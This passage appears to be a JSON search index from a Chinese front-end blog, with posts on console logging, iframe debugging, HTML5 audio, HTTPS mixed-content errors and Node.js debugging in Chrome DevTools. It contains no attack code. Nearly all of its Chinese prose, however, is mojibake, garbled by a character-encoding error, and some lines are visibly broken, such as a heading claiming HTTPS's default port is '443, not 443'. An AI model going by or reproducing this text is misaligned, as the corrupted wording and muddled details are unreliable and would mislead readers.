ä½†æ˜¯ä¼šè‡ªåŠ¨å­˜å‚¨ getLog() - è¿”å›æ‰€æœ‰æ—¥å¿— tail(numLines) - è¿”å›å°¾éƒ¨æ‰§è¡Œè¡Œæ—¥å¿—ï¼Œé»˜è®¤100è¡Œ search(string) - æœç´¢æ—¥å¿— getSlice(start, numLines) - æ—¥å¿—åˆ‡å‰² downloadLog() - ä¸‹è½½æ—¥å¿— clear() - æ¸…ç©ºæ—¥å¿— determineType() - ä¸€ä¸ªæ›´ç»†ç²’åº¦çš„typeofä¸ºæ‚¨æä¾›æ–¹ä¾¿ 4. å¯é€‰é…ç½® Â·Â·Â· // log in real time (forwards to console.","title":"ç»ˆäºæ‰¾åˆ°ä½ ï¼å¦‚ä½•å°†å‰ç«¯console.logçš„æ—¥å¿—ä¿å­˜æˆæ–‡ä»¶?"},{"content":"ä¹‹å‰ä¸€ç›´éå¸¸ç—›è‹¦ï¼Œåœ¨iframeå¤–å±‚æ ¹æœ¬è·å–ä¸äº†é‡Œé¢çš„ä¿¡æ¯ï¼Œåæ¥ä½¿ç”¨äº†postMessageç”¨ä¼ é€’æ¶ˆæ¯æ¥å®ç°ï¼Œä½†æ˜¯ç”¨èµ·æ¥è¿˜æ˜¯éå¸¸ä¸æ–¹ä¾¿ã€‚\nå…¶å®æµè§ˆå™¨æœ¬èº«æ˜¯å¯ä»¥é€‰æ‹©ä¸åŒçš„iframeçš„æ‰§è¡Œç¯å¢ƒçš„ã€‚ä¾‹å¦‚æœ‰ä¸ªå˜é‡æ˜¯åœ¨iframeé‡Œé¢å®šä¹‰çš„ï¼Œä½ åªéœ€è¦åˆ‡æ¢åˆ°è¿™ä¸ªiframeçš„æ‰§è¡Œç¯å¢ƒï¼Œä½ å°±å¯ä»¥éšæ„æ“ä½œè¿™ä¸ªç¯å¢ƒçš„ä»»ä½•å˜é‡äº†ã€‚\nè¿™ä¸ªå°æŠ€å·§ï¼Œå¯¹äºè°ƒè¯•éå¸¸æœ‰ç”¨ï¼Œä½†æ˜¯æˆ‘ç›´åˆ°ä»Šå¤©æ‰å‘ç°ã€‚\n1. Chrome è¿™ä¸ªå°ç®­å¤´å¯ä»¥è®©ä½ é€‰æ‹©ä¸åŒçš„iframeçš„æ‰§è¡Œç¯å¢ƒï¼Œå¯ä»¥åˆ‡æ¢åˆ°ä½ çš„iframeç¯å¢ƒé‡Œã€‚\n2. IE å¦‚å›¾æ‰€ç¤ºæ˜¯ie11çš„dev toolç‚¹å‡»ä¸‹æ¥ç®­å¤´ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¸åŒçš„iframeæ‰§è¡Œç¯å¢ƒã€‚\n3. å…¶ä»–æµè§ˆå™¨ å…¶ä»–æµè§ˆå™¨å¯ä»¥è‡ªè¡Œæ‘¸ç´¢ä¸€ä¸‹ã€‚ã€‚ã€‚ï¼ˆG_Hï¼‰\n","permalink":"https://wdd.js.org/posts/2018/02/debug-code-in-iframe/","summary":"ä¹‹å‰ä¸€ç›´éå¸¸ç—›è‹¦ï¼Œåœ¨iframeå¤–å±‚æ ¹æœ¬è·å–ä¸äº†é‡Œé¢çš„ä¿¡æ¯ï¼Œåæ¥ä½¿ç”¨äº†postMessageç”¨ä¼ é€’æ¶ˆæ¯æ¥å®ç°ï¼Œä½†æ˜¯ç”¨èµ·æ¥è¿˜æ˜¯éå¸¸ä¸æ–¹ä¾¿ã€‚\nå…¶å®æµè§ˆå™¨æœ¬èº«æ˜¯å¯ä»¥é€‰æ‹©ä¸åŒçš„iframeçš„æ‰§è¡Œç¯å¢ƒçš„ã€‚ä¾‹å¦‚æœ‰ä¸ªå˜é‡æ˜¯åœ¨iframeé‡Œé¢å®šä¹‰çš„ï¼Œä½ åªéœ€è¦åˆ‡æ¢åˆ°è¿™ä¸ªiframeçš„æ‰§è¡Œç¯å¢ƒï¼Œä½ å°±å¯ä»¥éšæ„æ“ä½œè¿™ä¸ªç¯å¢ƒçš„ä»»ä½•å˜é‡äº†ã€‚\nè¿™ä¸ªå°æŠ€å·§ï¼Œå¯¹äºè°ƒè¯•éå¸¸æœ‰ç”¨ï¼Œä½†æ˜¯æˆ‘ç›´åˆ°ä»Šå¤©æ‰å‘ç°ã€‚\n1. Chrome è¿™ä¸ªå°ç®­å¤´å¯ä»¥è®©ä½ é€‰æ‹©ä¸åŒçš„iframeçš„æ‰§è¡Œç¯å¢ƒï¼Œå¯ä»¥åˆ‡æ¢åˆ°ä½ çš„iframeç¯å¢ƒé‡Œã€‚\n2. IE å¦‚å›¾æ‰€ç¤ºæ˜¯ie11çš„dev toolç‚¹å‡»ä¸‹æ¥ç®­å¤´ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¸åŒçš„iframeæ‰§è¡Œç¯å¢ƒã€‚\n3. å…¶ä»–æµè§ˆå™¨ å…¶ä»–æµè§ˆå™¨å¯ä»¥è‡ªè¡Œæ‘¸ç´¢ä¸€ä¸‹ã€‚ã€‚ã€‚ï¼ˆG_Hï¼‰","title":"å¦‚ä½•æµè§ˆå™¨é‡Œè°ƒè¯•iframeé‡Œå±‚çš„ä»£ç ï¼Ÿ"},{"content":" æˆ‘è§‰å¾—DOMå°±å¥½åƒæ˜¯å…ƒç´ å‘¨æœŸè¡¨é‡Œçš„å…ƒç´ ï¼ŒJSå°±å¥½åƒæ˜¯å®éªŒå™¨æï¼Œé€šè¿‡å„ç§åŒ–å­¦ååº”ï¼Œäº§ç”Ÿå„ç§é­”æœ¯ã€‚\n1. Audio é€šè¿‡æ‰“å¼€è°·æ­Œæµè§ˆå™¨çš„dev tools -\u0026gt; Settings -\u0026gt; Elements -\u0026gt; Show user agent shadow DOM, ä½ å¯ä»¥çœ‹åˆ°å…¶å®Audioæ ‡ç­¾ä¹Ÿæ˜¯ç”±å¸¸ç”¨çš„ inputæ ‡ç­¾å’Œdivç­‰æ ‡ç­¾åˆæˆçš„ã€‚\n2. åŸºæœ¬ç”¨æ³• 1 \u0026lt;audio src=\u0026#34;http://65.ierge.cn/12/186/372266.mp3\u0026#34;\u0026gt; Your browser does not support the audio element. \u0026lt;/audio\u0026gt; \u0026lt;br\u0026gt; 2 \u0026lt;audio src=\u0026#34;http://65.ierge.cn/12/186/372266.mp3\u0026#34; controls=\u0026#34;controls\u0026#34;\u0026gt; Your browser does not support the audio element. \u0026lt;/audio\u0026gt; \u0026lt;br\u0026gt; // controlsListå±æ€§ç›®å‰åªæ”¯æŒ chrome 58+ 3 \u0026lt;audio src=\u0026#34;http://65.ierge.cn/12/186/372266.mp3\u0026#34; controls=\u0026#34;controls\u0026#34; controlsList=\u0026#34;nodownload\u0026#34;\u0026gt; Your browser does not support the audio element. \u0026lt;/audio\u0026gt; \u0026lt;br\u0026gt; 4 \u0026lt;audio controls=\u0026#34;controls\u0026#34;\u0026gt; \u0026lt;source src=\u0026#34;http://65.ierge.cn/12/186/372266.mp3\u0026#34; type=\u0026#39;audio/mp3\u0026#39; /\u0026gt; \u0026lt;/audio\u0026gt; ä½ å¯ä»¥çœ‹å‡ºä»–ä»¬åœ¨Chromeé‡Œè¡¨ç°çš„å·®å¼‚\nå…³äºaudioæ ‡ç­¾æ”¯æŒçš„éŸ³é¢‘ç±»å‹ï¼Œå¯ä»¥å‚è€ƒAudio#Supported_audio_coding_formats\n3. å¸¸ç”¨å±æ€§ autoplay: éŸ³é¢‘æµæ–‡ä»¶å°±ç»ªåæ˜¯å¦è‡ªåŠ¨æ’­æ”¾\npreload: \u0026ldquo;none\u0026rdquo; | \u0026ldquo;metadata\u0026rdquo; | \u0026ldquo;auto\u0026rdquo; | \u0026quot;\u0026quot;\n\u0026ldquo;none\u0026rdquo;: æ— éœ€é¢„åŠ è½½ \u0026ldquo;metadata\u0026rdquo;: åªéœ€è¦åŠ è½½å…ƒæ•°æ®ï¼Œä¾‹å¦‚éŸ³é¢‘æ—¶é•¿ï¼Œæ–‡ä»¶å¤§å°ç­‰ã€‚ \u0026ldquo;auto\u0026rdquo;: è‡ªåŠ¨ä¼˜åŒ–ä¸‹è½½æ•´ä¸ªæµæ–‡ä»¶ controlsï¼š \u0026ldquo;controls\u0026rdquo; | \u0026quot;\u0026quot; æ˜¯å¦éœ€è¦æ˜¾ç¤ºæ§ä»¶\nloopï¼š \u0026ldquo;loop\u0026rdquo; or \u0026quot;\u0026quot; æ˜¯å¦å¾ªç¯æ’­æ”¾\nmediagroupï¼š string å¤šä¸ªè§†é¢‘æˆ–è€…éŸ³é¢‘æµæ˜¯å¦åˆå¹¶\nsrcï¼š éŸ³é¢‘åœ°å€\n4. API(é‡ç‚¹) load(): åŠ è½½èµ„æº play(): æ’­æ”¾ pause(): æš‚åœ canPlayType()ï¼š è¯¢é—®æµè§ˆå™¨ä»¥ç¡®å®šæ˜¯å¦å¯ä»¥æ’­æ”¾ç»™å®šçš„MIMEç±»å‹ buffered()ï¼šæŒ‡å®šæ–‡ä»¶çš„ç¼“å†²éƒ¨åˆ†çš„å¼€å§‹å’Œç»“æŸæ—¶é—´ 5. å¸¸ç”¨äº‹ä»¶ï¼šMedia Events(é‡ç‚¹) äº‹ä»¶å ä½•æ—¶è§¦å‘ loadstart å¼€å§‹åŠ è½½ progress æ­£åœ¨åŠ è½½ suspend ç”¨æˆ·ä»£ç†æœ‰æ„æ— æ³•è·å–åª’ä½“æ•°æ®ï¼Œæ— æ³•è·å–æ•´ä¸ªæ–‡ä»¶ abort ä¸»åŠ¨ç»ˆç«¯ä¸‹è½½èµ„æºå¹¶ä¸æ˜¯ç”±äºå‘ç”Ÿé”™è¯¯ error è·å–èµ„æºæ—¶å‘ç”Ÿé”™è¯¯ play å¼€å§‹æ’­æ”¾ pause æ’­æ”¾æš‚åœ loadedmetadata åˆšè·å–å®Œå…ƒæ•°æ® loadeddata ç¬¬ä¸€æ¬¡æ¸²æŸ“å…ƒæ•°æ® waiting ç­‰å¾…ä¸­ playing æ­£åœ¨æ’­æ”¾ canplay ç”¨æˆ·ä»£ç†å¯ä»¥æ¢å¤æ’­æ”¾åª’ä½“æ•°æ®ï¼Œä½†æ˜¯ä¼°è®¡å¦‚æœç°åœ¨å¼€å§‹æ’­æ”¾ï¼Œåˆ™åª’ä½“èµ„æºä¸èƒ½ä»¥å½“å‰æ’­æ”¾é€Ÿç‡ç›´åˆ°å…¶ç»“æŸå‘ˆç°ï¼Œè€Œä¸å¿…åœæ­¢è¿›ä¸€æ­¥ç¼“å†²å†…å®¹ã€‚ canplaythrough ç”¨æˆ·ä»£ç†ä¼°è®¡ï¼Œå¦‚æœç°åœ¨å¼€å§‹æ’­æ”¾ï¼Œåˆ™åª’ä½“èµ„æºå¯ä»¥ä»¥å½“å‰æ’­æ”¾é€Ÿç‡ä¸€ç›´å‘ˆç°åˆ°å…¶ç»“æŸï¼Œè€Œä¸å¿…åœæ­¢è¿›ä¸€æ­¥çš„ç¼“å†²ã€‚ timeupdate å½“å‰æ’­æ”¾ä½ç½®ä½œä¸ºæ­£å¸¸æ’­æ”¾çš„ä¸€éƒ¨åˆ†è€Œæ”¹å˜ï¼Œæˆ–è€…ä»¥ç‰¹åˆ«æœ‰è¶£çš„æ–¹å¼ï¼Œä¾‹å¦‚ä¸è¿ç»­åœ°æ”¹å˜ã€‚ ended æ’­æ”¾ç»“æŸ ratechange åª’ä½“æ’­æ”¾é€Ÿåº¦æ”¹å˜ durationchange åª’ä½“æ—¶é•¿æ”¹å˜ volumechange åª’ä½“å£°éŸ³å¤§å°æ”¹å˜ 6. Audio DOM å±æ€§(é‡ç‚¹) 6.1. åªè¯»å±æ€§ durationï¼š åª’ä½“æ—¶é•¿ï¼Œæ•°å€¼ï¼Œ å•ä½s ended: æ˜¯å¦å®Œæˆæ’­æ”¾ï¼Œå¸ƒå°”å€¼ paused: æ˜¯å¦æ’­æ”¾æš‚åœï¼Œå¸ƒå°”å€¼ 6.2. å…¶ä»–å¯è¯»å†™å±æ€§(é‡ç‚¹) playbackRateï¼š æ’­æ”¾é€Ÿåº¦ï¼Œå¤§å¤šæ•°æµè§ˆå™¨æ”¯æŒ0.5-4ï¼Œ 1è¡¨ç¤ºæ­£å¸¸é€Ÿåº¦ï¼Œè®¾ç½®è¯¥å±æ€§å¯ä»¥ä¿®æ”¹æ’­æ”¾é€Ÿåº¦ volumeï¼š0.0-1.0ä¹‹é—´ï¼Œè®¾ç½®è¯¥å±æ€§å¯ä»¥ä¿®æ”¹å£°éŸ³å¤§å° muted: æ˜¯å¦é™éŸ³ï¼Œ è®¾ç½®è¯¥å±æ€§å¯ä»¥é™éŸ³ currentTimeï¼šæŒ‡å®šæ’­æ”¾ä½ç½®çš„ç§’æ•° // ä½ å¯ä»¥ä½¿ç”¨å…ƒç´ çš„å±æ€§seekableæ¥å†³å®šåª’ä½“ç›®å‰èƒ½æŸ¥æ‰¾çš„èŒƒå›´ã€‚å®ƒè¿”å›ä¸€ä¸ªä½ å¯ä»¥æŸ¥æ‰¾çš„TimeRanges æ—¶é—´å¯¹è±¡ã€‚ var mediaElement = document.getElementById(\u0026#39;mediaElementID\u0026#39;); mediaElement.seekable.start(); // è¿”å›å¼€å§‹æ—¶é—´ (in seconds) mediaElement.seekable.end(); // è¿”å›ç»“æŸæ—¶é—´ (in seconds) mediaElement.currentTime = 122; // è®¾å®šåœ¨ 122 seconds mediaElement.played.end(); // è¿”å›æµè§ˆå™¨æ’­æ”¾çš„ç§’æ•° ä»¥ä¸‹æ–¹æ³•å¯ä»¥ä½¿éŸ³é¢‘ä»¥2å€é€Ÿåº¦æ’­æ”¾ã€‚\n\u0026lt;audio id=\u0026#34;wdd\u0026#34; src=\u0026#34;http://65.ierge.cn/12/186/372266.mp3\u0026#34; controls=\u0026#34;controls\u0026#34;\u0026gt; Your browser does not support the audio element. \u0026lt;/audio\u0026gt; \u0026lt;script\u0026gt; var myAudio = document.getElementById(\u0026#39;wdd\u0026#39;); myAudio.playbackRate = 2; \u0026lt;/script\u0026gt; 7. å¸¸è§é—®é¢˜åŠè§£å†³æ–¹æ³• å½•éŸ³æ— æ³•æ‹–åŠ¨ï¼Œæ’­æ”¾ä¸€ç«¯å°±è‡ªåŠ¨åœæ­¢ï¼š https://wenjs.me/p/about-mp3progress-on-audio å¦‚ä½•éšè—Audioçš„ä¸‹è½½æŒ‰é’®ï¼šhttps://segmentfault.com/a/1190000009737051 æƒ³æ‰¾ä¸€ä¸ªç®€å•çš„å½•éŸ³æ’­æ”¾æ’ä»¶ï¼š https://github.com/kolber/audiojs 8. å‚è€ƒèµ„æ–™ W3C: the-audio-element\nwikipedia: HTML5 Audio\nW3C: HTML/Elements/audio\nNative Audio in the browser\nHTMLMediaElement.playbackRate\nä½¿ç”¨ HTML5 éŸ³é¢‘å’Œè§†é¢‘\n","permalink":"https://wdd.js.org/posts/2018/02/audio-heart-detail/","summary":"æˆ‘è§‰å¾—DOMå°±å¥½åƒæ˜¯å…ƒç´ å‘¨æœŸè¡¨é‡Œçš„å…ƒç´ ï¼ŒJSå°±å¥½åƒæ˜¯å®éªŒå™¨æï¼Œé€šè¿‡å„ç§åŒ–å­¦ååº”ï¼Œäº§ç”Ÿå„ç§é­”æœ¯ã€‚\n1. Audio é€šè¿‡æ‰“å¼€è°·æ­Œæµè§ˆå™¨çš„dev tools -\u0026gt; Settings -\u0026gt; Elements -\u0026gt; Show user agent shadow DOM, ä½ å¯ä»¥çœ‹åˆ°å…¶å®Audioæ ‡ç­¾ä¹Ÿæ˜¯ç”±å¸¸ç”¨çš„ inputæ ‡ç­¾å’Œdivç­‰æ ‡ç­¾åˆæˆçš„ã€‚\n2. åŸºæœ¬ç”¨æ³• 1 \u0026lt;audio src=\u0026#34;http://65.ierge.cn/12/186/372266.mp3\u0026#34;\u0026gt; Your browser does not support the audio element. \u0026lt;/audio\u0026gt; \u0026lt;br\u0026gt; 2 \u0026lt;audio src=\u0026#34;http://65.ierge.cn/12/186/372266.mp3\u0026#34; controls=\u0026#34;controls\u0026#34;\u0026gt; Your browser does not support the audio element. \u0026lt;/audio\u0026gt; \u0026lt;br\u0026gt; // controlsListå±æ€§ç›®å‰åªæ”¯æŒ chrome 58+ 3 \u0026lt;audio src=\u0026#34;http://65.ierge.cn/12/186/372266.mp3\u0026#34; controls=\u0026#34;controls\u0026#34; controlsList=\u0026#34;nodownload\u0026#34;\u0026gt; Your browser does not support the audio element. \u0026lt;/audio\u0026gt; \u0026lt;br\u0026gt; 4 \u0026lt;audio controls=\u0026#34;controls\u0026#34;\u0026gt; \u0026lt;source src=\u0026#34;http://65.","title":"Audio å¦‚æœä½ æ„¿æ„ä¸€å±‚ä¸€å±‚å‰¥å¼€æˆ‘çš„å¿ƒ"},{"content":"1. HTTPSåŸŸå‘HTTPåŸŸå‘é€è¯·æ±‚ä¼šè¢«æµè§ˆå™¨ç›´æ¥æ‹’ç»ï¼ŒHTTPå‘HTTPSåˆ™ä¸ä¼š ä¾‹å¦‚åœ¨github pagesé¡µé¢ï¼Œè¿™æ˜¯ä¸€ä¸ªhttpsé¡µé¢ï¼Œå¦‚æœåœ¨è¿™ä¸ªé¡µé¢å‘httpå‘é€è¯·æ±‚ï¼Œé‚£ä¹ˆä¼šç›´æ¥è¢«æµè§ˆå™¨æ‹’ç»ï¼Œå¹¶åœ¨æ§åˆ¶å°è¾“å‡ºä¸‹é¢çš„æŠ¥é”™ä¿¡æ¯ã€‚\njquery-1.11.3.min.js:5 Mixed Content: The page at \u0026#39;https://wangduanduan.github.io/ddddddd/\u0026#39; was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint \u0026#39;http://cccccc/log/conf?token=welljoint\u0026#39;. This request has been blocked; the content must be served over HTTPS. å¦‚æœä½ åœ¨åšç¬¬ä¸‰æ–¹é›†æˆçš„ç³»ç»Ÿï¼Œå¦‚æœä»–ä»¬æ˜¯åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è°ƒç”¨ä½ æä¾›çš„æ¥å£ï¼Œé‚£ä¹ˆæœ€å¥½ä½ ä½¿ç”¨httpsåè®®ï¼Œè¿™æ ·æ— è®ºå¯¹æ–¹æ˜¯httpsè¿˜æ˜¯httpéƒ½å¯ä»¥è®¿é—®ã€‚ï¼ˆç›¸ä¿¡æˆ‘ï¼Œè¿™ä¸ªå¾ˆé‡è¦ï¼Œæˆ‘æ›¾ç»ç»å†è¿‡ä¸Šçº¿åé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œç„¶åè¿å¤œç”³è¯·è¯ä¹¦ï¼ŒæŠŠhttpå‡çº§åˆ°httpsçš„ç—›è‹¦ç»å†ï¼‰\n2. HTTPSçš„é»˜è®¤ç«¯å£æ˜¯443ï¼Œè€Œä¸æ˜¯443 å¦‚æœ443ç«¯å£å·²ç»è¢«å…¶ä»–æœåŠ¡å ç”¨äº†ï¼Œé‚£ä¹ˆä½¿ç”¨å…¶ä»–ä»»ä½•æ²¡æœ‰è¢«å ç”¨çš„ç«¯å£éƒ½å¯ä»¥ç”¨ä½œHTTPSæœåŠ¡ï¼Œåªä¸è¿‡åœ¨è¯·æ±‚çš„æ—¶å€™éœ€è¦åŠ ä¸Šç«¯å£å·ç½¢äº†ã€‚\n3. å¦‚ä½•å¿«é€Ÿéšè—ä¸€ä¸ªDOMå…ƒç´  é€‰ä¸­ä¸€ä¸ªå…ƒç´ ï¼Œç„¶åæŒ‰h,è¿™æ—¶å€™å°±ä¼šåœ¨é€‰ä¸­çš„DOMå…ƒç´ ä¸ŠåŠ ä¸Š__web-inspector-hide-shortcut__ç±»ï¼Œè¿™ä¸ªç±»ä¼šè®©å…ƒç´ éšè—ã€‚è°·æ­Œå’Œç«ç‹ä¸Šéƒ½å¯ä»¥ï¼ŒIEä¸Šæ²¡æœ‰è¯•è¿‡è¡Œä¸è¡Œã€‚\n","permalink":"https://wdd.js.org/posts/2018/02/you-dont-know-https-and-http/","summary":"1. HTTPSåŸŸå‘HTTPåŸŸå‘é€è¯·æ±‚ä¼šè¢«æµè§ˆå™¨ç›´æ¥æ‹’ç»ï¼ŒHTTPå‘HTTPSåˆ™ä¸ä¼š ä¾‹å¦‚åœ¨github pagesé¡µé¢ï¼Œè¿™æ˜¯ä¸€ä¸ªhttpsé¡µé¢ï¼Œå¦‚æœåœ¨è¿™ä¸ªé¡µé¢å‘httpå‘é€è¯·æ±‚ï¼Œé‚£ä¹ˆä¼šç›´æ¥è¢«æµè§ˆå™¨æ‹’ç»ï¼Œå¹¶åœ¨æ§åˆ¶å°è¾“å‡ºä¸‹é¢çš„æŠ¥é”™ä¿¡æ¯ã€‚\njquery-1.11.3.min.js:5 Mixed Content: The page at \u0026#39;https://wangduanduan.github.io/ddddddd/\u0026#39; was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint \u0026#39;http://cccccc/log/conf?token=welljoint\u0026#39;. This request has been blocked; the content must be served over HTTPS. å¦‚æœä½ åœ¨åšç¬¬ä¸‰æ–¹é›†æˆçš„ç³»ç»Ÿï¼Œå¦‚æœä»–ä»¬æ˜¯åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è°ƒç”¨ä½ æä¾›çš„æ¥å£ï¼Œé‚£ä¹ˆæœ€å¥½ä½ ä½¿ç”¨httpsåè®®ï¼Œè¿™æ ·æ— è®ºå¯¹æ–¹æ˜¯httpsè¿˜æ˜¯httpéƒ½å¯ä»¥è®¿é—®ã€‚ï¼ˆç›¸ä¿¡æˆ‘ï¼Œè¿™ä¸ªå¾ˆé‡è¦ï¼Œæˆ‘æ›¾ç»ç»å†è¿‡ä¸Šçº¿åé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œç„¶åè¿å¤œç”³è¯·è¯ä¹¦ï¼ŒæŠŠhttpå‡çº§åˆ°httpsçš„ç—›è‹¦ç»å†ï¼‰\n2. HTTPSçš„é»˜è®¤ç«¯å£æ˜¯443ï¼Œè€Œä¸æ˜¯443 å¦‚æœ443ç«¯å£å·²ç»è¢«å…¶ä»–æœåŠ¡å ç”¨äº†ï¼Œé‚£ä¹ˆä½¿ç”¨å…¶ä»–ä»»ä½•æ²¡æœ‰è¢«å ç”¨çš„ç«¯å£éƒ½å¯ä»¥ç”¨ä½œHTTPSæœåŠ¡ï¼Œåªä¸è¿‡åœ¨è¯·æ±‚çš„æ—¶å€™éœ€è¦åŠ ä¸Šç«¯å£å·ç½¢äº†ã€‚\n3. å¦‚ä½•å¿«é€Ÿéšè—ä¸€ä¸ªDOMå…ƒç´  é€‰ä¸­ä¸€ä¸ªå…ƒç´ ï¼Œç„¶åæŒ‰h,è¿™æ—¶å€™å°±ä¼šåœ¨é€‰ä¸­çš„DOMå…ƒç´ ä¸ŠåŠ ä¸Š__web-inspector-hide-shortcut__ç±»ï¼Œè¿™ä¸ªç±»ä¼šè®©å…ƒç´ éšè—ã€‚è°·æ­Œå’Œç«ç‹ä¸Šéƒ½å¯ä»¥ï¼ŒIEä¸Šæ²¡æœ‰è¯•è¿‡è¡Œä¸è¡Œã€‚","title":"å¯èƒ½è¢«é—æ¼çš„httpsä¸httpçš„çŸ¥è¯†ç‚¹"},{"content":"è‹±æ–‡å¥½çš„ï¼Œç›´æ¥çœ‹åŸæ–‡\nhttps://blog.hospodarets.com/nodejs-debugging-in-chrome-devtools\n1. è¦æ±‚ Node.js 6.3+ Chrome 55+ 2. æ“ä½œæ­¥éª¤ 1 æ‰“å¼€è¿æ¥ chrome://flags/#enable-devtools-experiments 2 å¼€å¯å¼€å‘è€…å·¥å…·å®éªŒæ€§åŠŸèƒ½ 3 é‡å¯æµè§ˆå™¨ 4 æ‰“å¼€ DevTools Setting -\u0026gt; Experiments tab 5 æŒ‰6æ¬¡shiftåï¼Œéšè—çš„åŠŸèƒ½ä¼šå‡ºç°ï¼Œå‹¾é€‰\u0026quot;Node debugging\u0026quot; 3. è¿è¡Œç¨‹åº å¿…é¡»è¦æœ‰ --inspect\n\u0026gt; node --inspect www Debugger listening on port 9229. Warning: This is an experimental feature and could change at any time. To start debugging, open the following URL in Chrome: chrome-devtools://devtools/remote/serve_file/@60cd6e859b9f557d2312f5bf532f6aec5f284980/inspector.html?experiments=true\u0026amp;v8only=true\u0026amp;ws=localhost:9229/78a884f4-8c2e-459e-93f7-e1cbe87cf5cf å°†è¿™ä¸ªåœ°å€ç²˜è´´åˆ°è°·æ­Œæµè§ˆå™¨ï¼šchrome-devtools://devtools/remote/serve_file/@60cd6e859b9f557d2312f5bf532f6aec5f284980/inspector.html?experiments=true\u0026amp;v8only=true\u0026amp;ws=localhost:9229/78a884f4-8c2e-459e-93f7-e1cbe87cf5cf\nç¨‹åºåç«¯è¾“å‡ºçš„æ—¥å¿—ä¹Ÿå›è¾“å‡ºåˆ°è°·æ­Œæµè§ˆå™¨çš„consoleé‡Œé¢ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åœ¨Sourcesé‡Œè¿›è¡Œæ–­ç‚¹è°ƒè¯•äº†ã€‚ ","permalink":"https://wdd.js.org/posts/2018/02/debug-nodejs-in-chrome-devtool/","summary":"è‹±æ–‡å¥½çš„ï¼Œç›´æ¥çœ‹åŸæ–‡\nhttps://blog.hospodarets.com/nodejs-debugging-in-chrome-devtools\n1. è¦æ±‚ Node.js 6.3+ Chrome 55+ 2. æ“ä½œæ­¥éª¤ 1 æ‰“å¼€è¿æ¥ chrome://flags/#enable-devtools-experiments 2 å¼€å¯å¼€å‘è€…å·¥å…·å®éªŒæ€§åŠŸèƒ½ 3 é‡å¯æµè§ˆå™¨ 4 æ‰“å¼€ DevTools Setting -\u0026gt; Experiments tab 5 æŒ‰6æ¬¡shiftåï¼Œéšè—çš„åŠŸèƒ½ä¼šå‡ºç°ï¼Œå‹¾é€‰\u0026quot;Node debugging\u0026quot; 3. è¿è¡Œç¨‹åº å¿…é¡»è¦æœ‰ --inspect\n\u0026gt; node --inspect www Debugger listening on port 9229. Warning: This is an experimental feature and could change at any time. To start debugging, open the following URL in Chrome: chrome-devtools://devtools/remote/serve_file/@60cd6e859b9f557d2312f5bf532f6aec5f284980/inspector.html?experiments=true\u0026amp;v8only=true\u0026amp;ws=localhost:9229/78a884f4-8c2e-459e-93f7-e1cbe87cf5cf å°†è¿™ä¸ªåœ°å€ç²˜è´´åˆ°è°·æ­Œæµè§ˆå™¨ï¼šchrome-devtools://devtools/remote/serve_file/@60cd6e859b9f557d2312f5bf532f6aec5f284980/inspector.html?experiments=true\u0026amp;v8only=true\u0026amp;ws=localhost:9229/78a884f4-8c2e-459e-93f7-e1cbe87cf5cf\nç¨‹åºåç«¯è¾“å‡ºçš„æ—¥å¿—ä¹Ÿå›è¾“å‡ºåˆ°è°·æ­Œæµè§ˆå™¨çš„consoleé‡Œé¢ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åœ¨Sourcesé‡Œè¿›è¡Œæ–­ç‚¹è°ƒè¯•äº†ã€‚ ","title":"ç›´æ¥åœ¨Chrome DevToolsè°ƒè¯•Node.js"},{"content":"åŸæ–‡åœ°å€ï¼šhttps://hackernoon.com/few-simple-rules-for-good-coding-my-15-years-experience-96cb29d4acd9#.ddzpjb80c\nå—¨ï¼Œæˆ‘çš„å·¥ä½œä½œä¸ºä¸€ä¸ªç¨‹åºå‘˜è¶…è¿‡15å¹´ï¼Œå¹¶ä½¿ç”¨è®¸å¤šä¸åŒçš„è¯­è¨€ï¼ŒèŒƒä¾‹ï¼Œæ¡†æ¶å’Œå…¶ä»–ç‹—å±ã€‚æˆ‘æƒ³å’Œå¤§å®¶åˆ†äº«æˆ‘å†™å¥½ä»£ç çš„è§„åˆ™ã€‚\n1. ä¼˜åŒ–VSå¯è¯»æ€§ å»ä»–å¦ˆçš„ä¼˜åŒ– å§‹ç»ˆç¼–â€‹â€‹å†™æ˜“äºé˜…è¯»ä¸”å¯¹å¼€å‘äººå‘˜å¯ç†è§£çš„ä»£ç ã€‚å› ä¸ºåœ¨ç¡¬å¯è¯»ä»£ç ä¸ŠèŠ±è´¹çš„æ—¶é—´å’Œèµ„æºå°†è¿œè¿œé«˜äºä»ä¼˜åŒ–ä¸­è·å¾—çš„ã€‚ å¦‚æœä½ éœ€è¦è¿›è¡Œä¼˜åŒ–ï¼Œé‚£ä¹ˆä½¿å®ƒåƒDIçš„ç‹¬ç«‹æ¨¡å—ï¼Œå…·æœ‰100ï¼…çš„æµ‹è¯•è¦†ç›–ç‡ï¼Œå¹¶ä¸”ä¸ä¼šè¢«è§¦åŠè‡³å°‘ä¸€å¹´ã€‚\n2. æ¶æ„ç¬¬ä¸€ æˆ‘çœ‹åˆ°å¾ˆå¤šäººè¯´â€œæˆ‘ä»¬éœ€è¦å¿«é€Ÿåšäº‹ï¼Œæˆ‘ä»¬æ²¡æœ‰æ—¶é—´åšæ¶æ„â€ã€‚å…¶ä¸­çº¦99ï¼…çš„äººå› ä¸ºè¿™æ ·çš„æƒ³æ³•è€Œé‡åˆ°äº†å¤§é—®é¢˜ã€‚ ç¼–å†™ä»£ç è€Œä¸è€ƒè™‘å…¶æ¶æ„æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå°±åƒæ²¡æœ‰å®ç°å®ƒä»¬çš„è®¡åˆ’ä¸€æ ·ï¼Œæ¢¦æƒ³ä½ çš„æ„¿æœ›ã€‚ åœ¨ç¼–å†™ä»£ç çš„ç¬¬ä¸€è¡Œä¹‹å‰ï¼Œä½ 